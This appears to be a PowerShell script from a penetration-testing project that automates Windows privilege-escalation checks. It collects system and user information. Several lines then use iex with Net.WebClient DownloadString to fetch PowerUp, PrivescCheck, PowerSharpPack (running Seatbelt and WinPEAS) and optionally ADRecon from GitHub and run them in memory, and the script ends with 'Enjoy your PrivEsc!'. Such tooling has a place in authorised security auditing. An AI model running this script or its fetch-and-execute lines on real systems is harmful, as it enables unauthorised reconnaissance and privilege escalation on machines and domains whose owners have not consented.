# Author: LRVT - https://github.com/l4rm4nd/
# Automated Windows Privilege Escalation Checks (AWPEC)

Write-Host "            ___      _____ ___ ___ 			  " -ForegroundColor Red
Write-Host "           /_\ \    / / _ \ __/ __|			  " -ForegroundColor Red
Write-Host "          / _ \ \/\/ /|  _/ _| (__ 			  " -ForegroundColor Red
Write-Host "         /_/ \_\_/\_/ |_| |___\___|			  " -ForegroundColor Red
Write-Host " Automated Windows Privilege Escalation Checks" -ForegroundColor Red
Write-Host ""

# variables
$DATE = $(get-date -f yyyyMMddThhmm)
$PATH = "~/Documents/" + $DATE + "_" + "AWPEC" + "\"

# create RW directory
New-Item -ItemType Directory -Force -Path $PATH | Out-Null
cd $PATH 

# executing third party resources
# ------------------------------------------

systeminfo > systeminfo.txt
whoami /all > whoami.txt

Write-Host "[INFO] Downloading PowerUp into Memory" -ForegroundColor Gray
iex(New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
New-Item -ItemType Directory -Force -Path "PowerUp" | Out-Null; cd PowerUp
Write-Host "[RUN] Executing PowerUp - be patient!" -ForegroundColor Yellow
Invoke-AllChecks > powerup_results.txt
cd ..

#New-Item -ItemType Directory -Force -Path "SharpUp" | Out-Null; cd SharpUp
#Write-Host "[RUN] Executing SharpUp - be patient!" -ForegroundColor Yellow
#PowerSharpPack -sharpup -Command "Audit" > sharpup_results.txt
#cd ..

Write-Host "[INFO] Downloading PrivescCheck into Memory" -ForegroundColor Gray
iex(New-Object Net.WebClient).DownloadString("https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1")
New-Item -ItemType Directory -Force -Path "PrivescCheck" | Out-Null; cd PrivescCheck
Write-Host "[RUN] Executing PrivescCheck - be patient!" -ForegroundColor Yellow
Invoke-PrivescCheck -Report PrivescCheck_$env:computername -Format TXT,CSV,HTML,XML -Extended | Out-Null
cd ..

Write-Host "[INFO] Downloading PowerSharpPack into Memory" -ForegroundColor Gray
iex(New-Object net.webclient).DownloadString("https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/PowerSharpPack.ps1")
New-Item -ItemType Directory -Force -Path "Seatbelt" | Out-Null; cd Seatbelt
Write-Host "[RUN] Executing Seatbelt - be patient!" -ForegroundColor Yellow
PowerSharpPack -seatbelt -Command "-group=all" > seatbelt_results.txt
cd ..

New-Item -ItemType Directory -Force -Path "WinPEAS" | Out-Null; cd WinPEAS
Write-Host "[RUN] Executing WinPEAS - be patient!" -ForegroundColor Yellow
PowerSharpPack -winpeas -Command "notcolor" > winpeas_results.txt
cd ..

$confirmation = Read-Host "Do you want to run ADRecon? (y/n)"
if ($confirmation -eq 'y') {
	
Write-Host "[INFO] Downloading ADRecon into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')

New-Item -ItemType Directory -Force -Path "ADRecon" | Out-Null; cd ADRecon
Write-Host "[RUN] Executing ADRecon - be patient!" -ForegroundColor Yellow
Invoke-ADRecon -method LDAP -OutputType CSV -ADROutputDir . | Out-Null

Write-Host "[RUN] Auditing ADRecon CSV files" -ForegroundColor Yellow
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michiiii/Get-ADReconResults/main/Get-ADReconResult.ps1') > adrecon_results.txt
cd ..
}

Write-Host "[OK] AWPEC successfully finished. Enjoy your PrivEsc!" -ForegroundColor Green
